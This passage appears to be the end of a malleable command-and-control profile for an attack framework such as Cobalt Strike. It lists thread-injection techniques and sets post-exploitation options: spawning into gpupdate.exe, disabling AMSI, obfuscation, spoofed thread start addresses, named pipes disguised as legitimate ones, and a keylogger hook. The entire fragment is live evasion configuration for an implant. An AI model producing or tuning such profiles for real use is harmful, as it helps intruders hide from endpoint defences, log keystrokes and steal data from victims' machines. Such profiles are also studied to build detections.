
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";

}
